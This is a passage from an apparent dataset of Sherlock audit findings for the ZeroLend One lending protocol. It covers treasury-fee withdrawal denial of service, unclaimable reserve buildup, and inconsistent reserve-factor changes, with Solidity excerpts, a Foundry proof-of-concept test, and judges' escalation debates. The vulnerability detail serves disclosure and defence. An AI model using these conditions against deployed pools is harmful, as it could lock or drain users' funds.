\nIf this change was implemented it would also mitigate the DOSed withdrawals because a withdrawal would not revert when the pool has just enough liquidity to service the withdrawn assets. \n\nFinally, the point you make about AAVE accruing interest on treasury shares is not directly applicable to Zerolend because AAVE have removed `executeMintToTreasury()` from the pool withdraw flow [shown here](https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/pool/Pool.sol#L196-L216) [and here](https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/SupplyLogic.sol#L106-L163). \nAs a result, AAVEE need not worry about treasury fees being stored in shares because they won't DOS withdrawals.\n\n\nEDIT: for clarity I do conceed that impact 1 of this report by itself is low/info severity. But the fix for impact 1 also fixes DOSed withdrawals so it's closely related to impact 2 which is medium severity and matches the grouped family.\n\n**cvetanovv**\n\nI agree with @Nihavent comment that this issue can remain a duplicate with the others because it has caught the root cause, which the other issues have reported, and the second impact is the same as the other issues(withdrawal DoS).\n\nAlso, from the escalation, I agree that #240 does not belong in this group but in the #101 group.\n\nPlanning to reject the escalation of this issue(#430) to be invalid, but I'll duplicate #240 with #101.\n\n**0xSpearmint**\n\n@cvetanovv This issue is invalid.\n\nThe root cause of this issue as described by the watsons is that `executeMintToTreasury ` will revert when a user attempts to withdraw all the liquidity from a pool.\n\nThis is intended, consider the following scenario that assumes a 10% reserve factor:\n\n1. Lender lends 10 ETH\n2. Borrower borrows 10 ETH\n3. Later the borrower repays 5 ETH + 1 ETH interest (0.1ETH belongs to the treasury)\n4. Currently there is 6 ETH in the pool, If the lender attempts to withdraw 6 ETH it will revert **which is intended** because 0.1 ETH belongs to the treasury\n5. The lender can withdraw 5.9 ETH and have no issues\n\nWhile the 0.1 ETH is in the pool, it is not available liquidity for lenders to withdraw. It is reserved for the treasury\n\n**Nihavent**\n\n>”4. Currently there is 6 ETH in the pool, If the lender attempts to withdraw 6 ETH it will revert which is intended because 0.1 ETH belongs to the treasury”\n\nIn this example the lender has supply shares equal in value to 10.9 ETH, why should a withdrawal of 6 ETH revert when the pool has 6 ETH of liquidity? \nYes the treasury holds supply shares equal to 0.1 ETH. These supplyShares are the same as any other supplyShares and should not need to be provisioned for in every single withdrawal. \n\nWhat if treasuryShares are worth 2 ETH, a pool has 3 ETH of liquidity and a user who holds supplyShares worth 2 ETH attempts to withdraw 2 ETH. Why should this revert? \n\n\n>”The root cause of this issue as described by the watsons is that executeMintToTreasury  will revert when a user attempts to withdraw all the liquidity from a pool.”\n\nNot necessarily, the example I just gave shows a user attempting to withdraw less than all the liquidity available and still facing a revert. \n\n\nNote that Aave fixed this issue by removing ‘executeMintToTreasury’ from the withdrawal flow as I described [here](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/430#issuecomment-2395198139)\n\n**0xjuaan**\n\nThe pool has 6 ETH worth of liquidity, but 0.1 ETH is **reserved** for the treasury. Due to the **reserve** factor of 10%. Clearly these funds meant for the treasury should not be withdrawable by lenders.  \n\n**Nihavent**\n\n>” Clearly these funds meant for the treasury should not be withdrawable by lenders.”\n\nIt is completely misleading to suggest that lenders are trying to withdraw treasury funds. They’re only trying to withdraw <ins>their funds</ins>. \n\nThe issue is clearly visible in pools with low liquidity and accumulating treasury fees such as this example:\n\n>” What if treasuryShares are worth 2 ETH, a pool has 3 ETH of liquidity and a user who holds supplyShares worth 2 ETH attempts to withdraw 2 ETH.”\n\nWhere a withdrawal of any amount exceeding 1 ETH is DOSed until a repayment/deposit is made that covers the withdrawal amount and all treasury fees (which continue to accumulate). Note if the asset value of the treasury shares exceeds the available liquidity in the pool all withdrawals are DOSed. \n\nIt seems like you’re making the variable name ‘reserveFactor’ do too much work. If these funds were truly intended to be reserved, they would not be borrowable. \n\nThis issue was fixed in Aave for a reason, I’m yet to see a compelling argument why it’s not an issue in Zerolend \n\n\n**cvetanovv**\n\nI believe this issue and its duplicates (excluding #240) are valid because the accumulation of treasury fees could ultimately result in a situation where all withdrawals from the pool are DOSed. \n\nThis occurs when the total accrued treasury fees exceed the available liquidity in the pool, thereby preventing suppliers from withdrawing their assets until the pool is replenished.\n\nAs @Nihavent has pointed out,  Aave resolved this issue by excluding ‘executeMintToTreasury’ from the withdrawal flow.\n\nMy previous decision to reject escalation remains. I will only invalidate #240\n\n**0xSpearmint**\n\n@cvetanovv The treasury fees is 10% of the interest paid on loans. This is orders of magnitude smaller than the principal liquidity of the pool. It is not realistic at all for the treasury fees to exceed the available liquidity in the pool unless the pool has > 99% utilization so there is barely anything left. This edge case will not last long at all since the borrower will have a huge interest rate to pay so the DOS will be well below 7 days and the lenders will receive huge yield for that period.\n\nFurthermore every time a single successful withdrawal occurs, the treasury fees reset to 0. This makes it even harder to accumulate an amount to cause a DOS.\n\n**Nihavent**\n\n>\"It is not realistic at all for the treasury fees to exceed the available liquidity in the pool unless the pool has > 99% utilization so there is barely anything left. This edge case will not last long at all since the borrower will have a huge interest rate to pay so the DOS will be well below 7 days and the lenders will receive huge yield for that period.\"\n\nYour comment is making a lot of assumptions given high utilization is a completely valid pool state. There are a variety of IRMs and varying incentives for users.\n\n- There may be pools using `DefaultInterestRateStrategy` where the 'debtSlope' settings are not high enough. In these pools, the utilization has minimal impact on rates and users have little incentive to repay quickly.\n- Even if this isn't the case, higher utilization results in more interest repaid which results in more treasury fees which further increases the minimum deposit or repayment required to un-dos withdrawals. \n- Not all IRMs increase rates as a function of utilization, we can see the codebase has plans for a `FixedInterestRateStrategy`. Your comment gives no consideration to extended DOS in pools with fixed rate stratergies. \n\n>\"Furthermore every time a single successful withdrawal occurs, the treasury fees reset to 0. This makes it even harder to accumulate an amount to cause a DOS.\"\n\nThe issue is no withdrawal can occur when accumulated treasury shares exceed pool liquidity. \n\n**cvetanovv**\n\nI agree with @Nihavent comment, and my previous decision remains: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/430#issuecomment-2435074872\n\n**WangSecurity**\n\nResult:\nMedium\nHas duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [Honour-d-dev](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/430/#issuecomment-2392041769): rejected",
      "summary": "\nThis report discusses a bug found in Zerolend that results in higher than expected treasury fees and, under rare circumstances, can cause a denial of service for pool withdrawals. The root cause of the issue is that fees on debt interest are calculated in 'assets' but not claimed immediately, resulting in higher than expected fees. This also leads to a situation where there may not be enough liquidity for regular pool suppliers to withdraw their funds. The bug has been identified by multiple security researchers and has been found to be the same root cause as other reported issues. The suggested fix for this issue is to send the fees in assets to the treasury upon debt repayment instead of minting treasury shares, which accrue over time. This would also mitigate the DOSed withdrawals. The issue has been resolved and marked as a valid duplicate of other similar issues.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/430",
      "tags": [],
      "finders": [
        "Nihavent",
        "trachev",
        "0xAlix2",
        "A2-security",
        "Ocean\\_Sky",
        "Bigsam"
      ]
    },
    {
      "id": "41831",
      "title": "M-10: Unclaimable reserve assets will accrue in a pool due to the difference between interest paid on borrows and interest earned on supplies",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/429 \n\n## Found by \nNihavent, iamnmt\n### Summary\n\nThe interest paid on borrows is calculated in a compounding fashion, but the interest earned on supplying assets is calculated in a fixed way. As a result more interest will be repaid by borrowers than is claimable by suppliers. This buildup of balance never gets rebased into the `liquidityIndex`, nor is it claimable with some sort of 'skim' function.\n\n### Root Cause\n\nAny time an action calls `ReserveLogic::updateState()`, [`ReserveLogic::_updateIndexes()` is called](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L91).\n\nIn `_updateIndexes()`, the `_cache.nextLiquidityIndex` is a [scaled up](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L226) version of `_cache.currLiquidityIndex` based on the 'linear interest' [calculated in `MathUtils::calculateLinearInterest()`](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L225).\n\n[`calculateLinearInterest`](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/utils/MathUtils.sol#L34-L42) scales a fixed interest annual interest rate by the amount of time elapsed since the last call:\n\n```javascript\n  function calculateLinearInterest(uint256 rate, uint40 lastUpdateTimestamp) internal view returns (uint256) {\n    //solium-disable-next-line\n    uint256 result = rate * (block.timestamp - uint256(lastUpdateTimestamp));\n    unchecked {\n      result = result / SECONDS_PER_YEAR;\n    }\n\n    return WadRayMath.RAY + result;\n  }\n```\n\n\nSimilarly, the `_cache.nextBorrowIndex` is a [scaled up](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L236) version of `_cache.currBorrowIndex` based on the 'compound interest' [calculated in `MathUtils::calculateCompoundedInterest()`](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L235).\n\n[`calculateCompoundedInterest`](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/utils/MathUtils.sol#L58C12-L89) compounds a rate based on the time elapsed since it was last called:\n\n```javascript\n  function calculateCompoundedInterest(uint256 rate, uint40 lastUpdateTimestamp, uint256 currentTimestamp) internal pure returns (uint256) {\n    //solium-disable-next-line\n    uint256 exp = currentTimestamp - uint256(lastUpdateTimestamp);\n\n    if (exp == 0) {\n      return WadRayMath.RAY;\n    }\n\n    uint256 expMinusOne;\n    uint256 expMinusTwo;\n    uint256 basePowerTwo;\n    uint256 basePowerThree;\n    unchecked {\n      expMinusOne = exp - 1;\n      expMinusTwo = exp > 2 ? exp - 2 : 0;\n\n      basePowerTwo = rate.rayMul(rate) / (SECONDS_PER_YEAR * SECONDS_PER_YEAR);\n      basePowerThree = basePowerTwo.rayMul(rate) / SECONDS_PER_YEAR;\n    }\n\n    uint256 secondTerm = exp * expMinusOne * basePowerTwo;\n    unchecked {\n      secondTerm /= 2;\n    }\n    uint256 thirdTerm = exp * expMinusOne * expMinusTwo * basePowerThree;\n    unchecked {\n      thirdTerm /= 6;\n    }\n\n    return WadRayMath.RAY + (rate * exp) / SECONDS_PER_YEAR + secondTerm + thirdTerm;\n  }\n```\n\nAs a result, more interest is payable on debt than is earned on supplied liquidity. This is a design choice by the protocol, however without a function to 'skim' this extra interest, these tokens will buildup and are locked in the protocol. \n\n### Internal pre-conditions\n\n1. Pool operates normally with supplies/borrows/repays\n2. `updateState()` must NOT be called every second, as this would create a compounding-effect on the 'linear rate' such that the difference in interest paid on debts is equal to the interest earned on supplies.\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\n1. Several users supply tokens to a pool as normal\n2. Users borrow against the liquidity\n3. Time passes, all borrows are repaid\n4. All suppliers withdraw their funds (as part of this operation the treasury also withdraws their fee assets)\n5. A pool remains with 0 supplyShares and 0 debtShares, but still has a token balance which is unclaimable by anyone\n\n### Impact\n\n1. Token buildup in contract is unclaimable by anyone\n   - The built up token balance can be borrowed and flash loaned, leading to compounding build up of unclaimable liquidity\n\n\n### PoC\n\nCreate a new file in /test/forge/core/pool and paste the below contents. The test shows a simple supply/borrow/warp/repay flow. After the actions are complete, the pool has more `tokenB` than is claimable by the supplier and the treasury. These tokens are now locked in the contract \n\n```javascript\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.19;\n\nimport {console2} from 'forge-std/src/Test.sol';\nimport {PoolLiquidationTest} from './PoolLiquidationTests.t.sol';\n\ncontract AuditUnclaimableBalanceBuildupOnPool is PoolLiquidationTest {\n\n  function test_POC_UnclaimableBalanceBuildupOnPool () public {\n    uint256 aliceMintAmount = 10_000e18;\n    uint256 bobMintAmount = 10_000e18;\n    uint256 supplyAmount = 1000e18;\n    uint256 borrowAmount = 1000e18;\n\n    _mintAndApprove(alice, tokenA, aliceMintAmount, address(pool));         // alice collateral\n    _mintAndApprove(bob, tokenB, bobMintAmount, address(pool));             // bob supply\n    _mintAndApprove(alice, tokenB, aliceMintAmount, address(pool));         // alice needs some funds to pay interest\n\n    vm.startPrank(bob);\n    pool.supplySimple(address(tokenB), bob, supplyAmount, 0); \n    vm.stopPrank();\n\n    vm.startPrank(alice);\n    pool.supplySimple(address(tokenA), alice, aliceMintAmount, 0);  // alice collateral\n    pool.borrowSimple(address(tokenB), alice, borrowAmount, 0);     // 100% utilization\n    vm.stopPrank();\n\n    vm.warp(block.timestamp + 365 days); // Time passes, interest accrues, treasury shares accrue\n    pool.forceUpdateReserves();\n\n    // Alice full repay\n    vm.startPrank(alice);\n    tokenB.approve(address(pool), type(uint256).max);\n    pool.repaySimple(address(tokenB), type(uint256).max, 0);\n\n    (,,, uint256 debtShares) = pool.marketBalances(address(tokenB));\n    // All debt has been repaid\n    assert(debtShares == 0); \n\n    // Bob's claim on pool's tokenB\n    bytes32 bobPos = keccak256(abi.encodePacked(bob, 'index', uint256(0)));\n    uint256 BobsMaxWithdrawAssets = pool.supplyShares(address(tokenB), bobPos) * pool.getReserveData(address(tokenB)).liquidityIndex / 1e27;\n\n    // Treasury claim on pool's tokenB\n    uint256 accruedTreasuryAssets = pool.getReserveData(address(tokenB)).accruedToTreasuryShares * pool.getReserveData(address(tokenB)).liquidityIndex / 1e27;\n\n    // Total balance of pool's tokenB\n    uint256 poolTokenBBalance = tokenB.balanceOf(address(pool));\n\n    assert(poolTokenBBalance > BobsMaxWithdrawAssets + accruedTreasuryAssets); // There are more tokenB on the pool than all suppliers + treasury claim. \n  }\n\n}\n```\n\n### Mitigation\n\nOne option is to create a function which claims the latent funds to the treasury, callable by an owner\n- Calls `forceUpdateReserves()`\n- Calls `executeMintToTreasury()`\n- Calculates the latent funds on a pool's reserve (something like `tokenA.balanceOf(pool) - ( totalSupplyShares * liquidityIndex )`)\n- Sends these funds to the treasury\n\nAnother option would be to occasionally rebase `liquidityIndex` to increase the value of supplyShares so supplies have a claim on these extra funds.\n\nIn both cases it may be sensible to leave some dust as a buffer. \n\n\n\n## Discussion\n\n**0xspearmint1**\n\nescalate\n\nThis issue is invalid for multiple reasons\n\n1. The condition for this issue as stated by the watson is that `updateState()` must NOT be called regularly. This is totally unrealistic since any any action (supply, borrow, withdraw, repay, etc) will call `updateState()`. In the POC they provided, it involves not calling `updateState()` for 365 days after borrowing funds.\n\n2. Sherlock's [criteria for a medium issue](https://docs.sherlock.xyz/audits/real-time-judging/judging#v.-how-to-identify-a-medium-issue) requires the following:\n>Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.\n\nNo user experiences a loss in this issue  \n1. Lenders receive the correct interest rate  \n2. Borrowers pay the correct borrow rate\n\n**sherlock-admin3**\n\n> escalate\n> \n> This issue is invalid for multiple reasons\n> \n> 1. The condition for this issue as stated by the watson is that `updateState()` must NOT be called regularly. This is totally unrealistic since any any action (supply, borrow, withdraw, repay, etc) will call `updateState()`. In the POC they provided, it involves not calling `updateState()` for 365 days after borrowing funds.\n> \n> 2. Sherlock's [criteria for a medium issue](https://docs.sherlock.xyz/audits/real-time-judging/judging#v.-how-to-identify-a-medium-issue) requires the following:\n> >Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.\n> \n> No user experiences a loss in this issue  \n> 1. Lenders receive the correct interest rate  \n> 2. Borrowers pay the correct borrow rate\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Nihavent**\n\n>\"1. The condition for this issue as stated by the watson is that updateState() must NOT be called regularly. This is totally unrealistic since any any action (supply, borrow, withdraw, repay, etc) will call updateState(). In the POC they provided, it involves not calling updateState() for 365 days after borrowing funds.\"\n\nThe escalation comment misquoted the report saying \"updateState() must NOT be called regularly\" when the report states \"updateState() must NOT be called every second\". These are meaningfully different statements because the impact is present when updateState() is called as frequently as 2 seconds, which is more frequently than what would be expected in most pool/asset combinations.\n\nThe elapsed time between `updateState()` calls is completely arbitrary and in the POC I used 365 days as a matter of habbit. See adjusted POC below where <u>instead of warping 365 days, we warp just 2 seconds and the test still passes</u>:\n\n```diff\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.19;\n\nimport {console2} from 'forge-std/src/Test.sol';\nimport {PoolLiquidationTest} from './PoolLiquidationTests.t.sol';\n\ncontract AuditUnclaimableBalanceBuildupOnPool is PoolLiquidationTest {\n\n    ...\n\n-   vm.warp(block.timestamp + 365 days); // Time passes, interest accrues, treasury shares accrue\n+   vm.warp(block.timestamp + 2 seconds); // Time passes, interest accrues, treasury shares accrue\n    pool.forceUpdateReserves();\n\n    ...\n  }\n\n}\n```\n\n```javascript\nRan 1 test for test/forge/core/pool/UnclaimableBalanceBuildupOnPool.t.sol:AuditUnclaimableBalanceBuildupOnPool\n[PASS] test_POC_UnclaimableBalanceBuildupOnPool() (gas: 811472)\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 11.18ms (1.08ms CPU time)\n```\n\n\n>\"2. Sherlock's criteria for a medium issue requires the following:\n>\n>Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.\n>\n>No user experiences a loss in this issue\n>\n>Lenders receive the correct interest rate\n>Borrowers pay the correct borrow rate\"\n\nFunds locked in the contract must be considered lost because they are permanently unretrievable. \n\nThe amount locked (lets call it surpluss) increases every time debt is repaid. Over time it's reasonable to expect a signficiant portion of all a pool's assets will be surpluss and not claimable by anyone.\n\nThe value of locked funds will clearly exceed 10 USD as there will usually be several percentage points difference between the indexes. This of course will vary depending on the frequency of `updateState()` calls. If this needs to be quantified I would be happy to help, but it clearly exceeds dust values.\n\nFinally, we can refer to the [Sherlock standards](https://github.com/sherlock-protocol/sherlock-v2-docs/blob/e7dc89270b05f8d2fcee69dc4204c7a2b8fb4cf9/audits/judging/judging/README.md?plain=1#L43-L47) to determine that permanent locked funds constitutes a valid issue:\n\n>\"2. **Could Denial-of-Service (DOS), griefing, or locking of contracts count as a Medium (or High) issue?** DoS has two separate scores on which it can become an issue:\n>   1. The issue causes locking of funds for users for more than a week.\n>   2. The issue impacts the availability of time-sensitive functions (cutoff functions are not considered time-sensitive).\n>If at least one of these are describing the case, the issue can be a Medium. If both apply, the issue can be considered of High severity. Additional constraints related to the issue may decrease its severity accordingly. \\\n>Griefing for gas (frontrunning a transaction to fail, even if can be done perpetually) is considered a DoS of a single block, hence only if the function is clearly time-sensitive, it can be a Medium severity issue.\"\n\n\n**cvetanovv**\n\nFor me, this issue is borderline Medium/Low. Because of this, we have to look at Sherlock's rules.\n\nThese are the requirements for Medium severity:\n\n> Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.\n\nThe losses exceed 0.01% and 10 USD, and the issue meets the requirements for Medium severity.\n\nPlanning to reject the escalation and leave the issue as is.\n\n**0xSpearmint**\n\n@cvetanovv Who exactly is experiencing the loss of funds here?\n\nThe borrowers pay the expected borrow rate according to the interest rate contract.\n\nThe lenders receive the expected supply rate according to the interest rate contract.\n\nThe protocol receives the expected revenue from the reserve factor.\n\nAAVE does implement a [rescueTokens ](https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/PoolLogic.sol#L75) function but it allows the owner to arbitrarily remove any amount of tokens from the pool, this is fine because AAVE governance is trusted. However, in ZeroLend pool deployment is permission-less, implementing such a function for each pool would pose a huge security risk which is why the protocol chose to not implement it. \n\nThis looks like an obvious design choice to me. \n\n**DemoreXTess**\n\n@cvetanovv I agree with @0xSpearmint. This is actually not simply a design choice. Using compounding rate for borrowers and linear rate for suppliers are recommended way to build a lending protocol. In order to keep protocols health at higher point most of the lending protocol using this way. Those money is not lost, it's always in circulation for keeping liquidity in safe point. Repaying all the debt and getting all the pools' money is not rational movement in this PoC. There is no impact here as @0xSpearmint mentioned. \n\nSecondly, I wonder @Nihavent did you solve all the problems in the protocl which is related with interest rate and accrued fund ?  Because identifying this problem with this PoC is really hard in current circumstances. We have 33 findings right now. I don't know how many of them related with those.\n\n**Nihavent**\n\nWe all seem to agree that there will be unclaimable assets building up in the pool. These are the funds that are locked in the contract, and these funds are clearly lost. \n\n>” This looks like an obvious design choice to me.”\n\nGiven that the devs implemented ‘sweep()’ in NFTPositionManager which claims tokens of much lower value, not implementing similar functionality in the Pool contract is an obvious oversight and cannot be considered design. \n\nAnother piece of evidence that this is not a design choice is the [code comment](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/utils/MathUtils.sol#L50)\n\n>”The approximation slightly underpays liquidity providers and undercharges borrowers”\n\nThe comment indicates that due to using binomial approximation (3 terms) to calculate compounding interest, borrowers slightly underpay interest and suppliers receive slightly less interest. \nThis gives us a glimpse into the dev’s intentions that the supply interest earned should be much closer (potentially even equal to) to the debt interest paid (otherwise the precision lost due to this implementation does not matter). \nThe current implementation allows a buildup of unclaimable funds which far exceeds the precision lost in the code comment. \n\n\n@0xSpearmint \n### Who lost the funds?\nIt would be up to the protocol to make a design decision as to who claims these funds. \nIf we take the code comment above it would appear that the suppliers are entitled to these funds (the suppliers must earn close to the interest repaid by borrowers for suppliers to feel the precision lost described in the code comment). \nI did not take a definitive stand on this, I don’t believe it’s require for valid medium severity. \n\n\n@DemoreXTess \n>” Using compounding rate for borrowers and linear rate for suppliers are recommended way to build a lending protocol.”\n\nThis is completely fine as long as there is a way to claim the delta between repaid debt interest and earned supply interest. If not this delta is locked in the contract. \n\n\n>” Those money is not lost, it's always in circulation for keeping liquidity in safe point. Repaying all the debt and getting all the pools' money is not rational movement in this PoC.”\n\nYes the unclaimable assets continue to be borrowed and repaid, which further increases the amount of unclaimable assets. Don’t be fooled by the fact that money is moving, a significant portion of it is unclaimable. \n\nRepaying all debt and showing that the total claimable assets is less than the total pool’s assets was the simplest way to show this issue. This is a rational situation in Zerolend with permissionless pools, many pools will become inactive and liquidity may concentrate towards ‘high performing’ pools. In the current implementation all inactive pools will have latent funds locked permanently. \n \nEven in active pools the unclaimable reserve is building up, which is why Aave fixed this problem with ‘rescueTokens’\n\n\n**cvetanovv**\n\nI agree with @Nihavent \n\nWe have a token loss that meets the Medium severity requirement.\n\n> The loss of the affected party must exceed 0.01% and 10 USD.\n\nThese tokens remain permanently locked in the contract. AAVE has implemented a `rescueTokens` function, which fixes the problem. However, I agree that the recommendation here to implement the same function is not good and may open a new vulnerability because, in the ZeroLend pool, deployment is permissionless. The issue is valid, and the ZeroLend team is left to decide if and how they will fix the stuck tokens.\n\nMy decision to reject the escalation remains.\n\n**WangSecurity**\n\nResult:\nMedium\nHas duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [0xspearmint1](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/429/#issuecomment-2394981478): rejected",
      "summary": "\nThis bug report discusses an issue with a lending protocol where unclaimable reserve assets are accruing due to a difference in the way interest is calculated for borrowers and suppliers. This can lead to a buildup of locked funds in the contract, which cannot be retrieved by anyone. The report also mentions that this issue meets the criteria for a medium severity issue according to Sherlock's standards. However, there is some disagreement among the team about whether this is a design choice or an oversight. The report concludes by stating that the issue has been resolved successfully.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/429",
      "tags": [],
      "finders": [
        "Nihavent",
        "iamnmt"
      ]
    },
    {
      "id": "41830",
      "title": "M-9: Inconsistent Application of Reserve Factor Changes Leads to Protocol Insolvency Risk",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/402 \n\n## Found by \nA2-security, denzi\\_, zarkk01\n## Summary\n\nThe ZeroLend protocol's `PoolFactory` allows for global changes to the `reserveFactor`, which affects all pools simultaneously. However, the `ReserveLogic` contract applies this change inconsistently between interest accrual and treasury minting processes. This inconsistency leads to a mismatch between accrued interest for users and the amount minted to the treasury, causing protocol insolvency or locked funds.\n\n## Vulnerability Detail\n\nThe `reserveFactor` is a crucial parameter in the protocol that determines the portion of interest accrued from borrowers that goes to the protocol's treasury. It's defined in the `PoolFactory` contract:\n\n```js\ncontract PoolFactory is IPoolFactory, Ownable2Step {\n// ...\nuint256 public reserveFactor;\n// ...\n}\n```\n\nThis `reserveFactor` is used across all pools created by the factory. It's retrieved in various operations, such as in the `supply` function for example :\n\n```js\nfunction _supply(address asset, uint256 amount, bytes32 pos, DataTypes.ExtraData memory data) internal nonReentrant(RentrancyKind.LENDING) returns (DataTypes.SharesType memory res) {\n// ...\nres = SupplyLogic.executeSupply(\n_reserves[asset],\n_usersConfig[pos],\n_balances[asset][pos],\n_totalSupplies[asset],\nDataTypes.ExecuteSupplyParams({reserveFactor: _factory.reserveFactor(), /_ ... _/})\n);\n// ...\n}\n```\n\nThe `reserveFactor` plays a critical role in calculating interest rates and determining how much of the accrued interest goes to the liquidity providers and how much goes to the protocol's treasury . The issue arises from the fact that this `reserveFactor` can be changed globally for all pools:\n\n```js\nfunction setReserveFactor(uint256 updated) external onlyOwner {\nuint256 old = reserveFactor;\nreserveFactor = updated;\nemit ReserveFactorUpdated(old, updated, msg.sender);\n}\n```\n\n let's examine how this change affects the core logic in the `ReserveLogic` contract:\n\n```js\nfunction updateState(DataTypes.ReserveData storage self, uint256 _reserveFactor, DataTypes.ReserveCache memory _cache) internal {\nif (self.lastUpdateTimestamp == uint40(block.timestamp)) return;\n\n    _updateIndexes(self, _cache);\n    _accrueToTreasury(_reserveFactor, self, _cache);\n\n    self.lastUpdateTimestamp = uint40(block.timestamp);\n\n}\n```\n\nThe vulnerability lies in the fact that `_updateIndexes` and `_accrueToTreasury` will use different `reserveFactor` values when a change occurs:\n\nif the reserveFactors is changed `_updateIndexes` will uses the old `reserveFactor` implicitly through cached liquidityRate:\n\n```js\nfunction _updateIndexes(DataTypes.ReserveData storage _reserve, DataTypes.ReserveCache memory _cache) internal {\nif (_cache.currLiquidityRate != 0) {\nuint256 cumulatedLiquidityInterest = MathUtils.calculateLinearInterest(_cache.currLiquidityRate, _cache.reserveLastUpdateTimestamp);\n_cache.nextLiquidityIndex = cumulatedLiquidityInterest.rayMul(_cache.currLiquidityIndex).toUint128();\n_reserve.liquidityIndex = _cache.nextLiquidityIndex;\n}\n// ...\n}\n```\n\n`_accrueToTreasury` will use the new `reserveFactor`:\n\n```js\nfunction _accrueToTreasury(uint256 reserveFactor, DataTypes.ReserveData storage _reserve, DataTypes.ReserveCache memory _cache) internal {\n// ...\nvars.amountToMint = vars.totalDebtAccrued.percentMul(reserveFactor);\nif (vars.amountToMint != 0) _reserve.accruedToTreasuryShares += vars.amountToMint.rayDiv(_cache.nextLiquidityIndex).toUint128();\n}\n```\n\nThis discrepancy results in the protocol minting more/less treasury shares than it should based on the actual accrued interest cause it uses the new `reserveFactor`. Over time, this can lead to a substantial overallocation/underallocation of funds to the treasury, depleting the reserves available for users or leaving funds locked in the pool contract forever.\n\n#### example scenario :\n- to simplify this issue consider the following example : \n- Deposited: `10,000 USD`\n- Borrowed: `10,000 USD`\n- Initial `reserveFactor`: `10%`\n- Borrow rate: `12%`\n- Utilization ratio: `100%`\n- Liquidity rate: `12% * (100% - 10%) = 10.8%`\n\nAfter 2 months:\n\n- Accrued interest: `200 USD`\n- `reserveFactor` changed to `30%`\n- `updateState` is called:\n  - `_updateIndexes`: Liquidity index = `(0.018 + 1) * 1 = 1.018` (based on old `10.8%` rate)\n  - `_accrueToTreasury`: Amount to mint = `200 * 0.3 = 60 USD` (using new `30%` `reserveFactor`)\n\nWhen a user attempts to withdraw:\n\n- User's assets: `10,000 * 1.018 = 10,180 USD`\n- Treasury owns: `60 USD`\n- Total required: `10,240 USD`\n\nHowever, the borrower only repaid `10,200 USD` (`10,000` principal + `200` interest), resulting in a `40 USD` shortfall. This discrepancy can lead to failed withdrawals and insolvency of the protocol.\n\n## Impact\n\nthe Chage of `reserveFactor` leads to protocol insolvency risk or locked funds. Increased `reserveFactor` causes over-minting to treasury, leaving insufficient funds for user withdrawals. Decreased `reserveFactor` results in under-minting, locking tokens in the contract permanently. Both scenarios compromise the protocol's financial integrity\n\n## Code Snippet\n\n- https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/PoolFactory.sol#L112-L116\n- https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L210\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n- Given ZeroLend's permissionless design where anyone can create a pool, updating all pools simultaneously before updating the `reserveFactor` is impractical. we recommend storing the `lastReserveFactor` used for each pool. This approach is similar to other protocols and ensures consistency between interest accrual and treasury minting.\n\nAdd a new state variable in the ReserveData struct:\n\n```diff\nstruct ReserveData {\n    // ... existing fields\n+    uint256 lastReserveFactor;\n}\n```\n\nModify the updateState function to use and update this lastReserveFactor:\n\n```diff\nfunction updateState(DataTypes.ReserveData storage self, uint256 _reserveFactor, DataTypes.ReserveCache memory _cache) internal {\n    if (self.lastUpdateTimestamp == 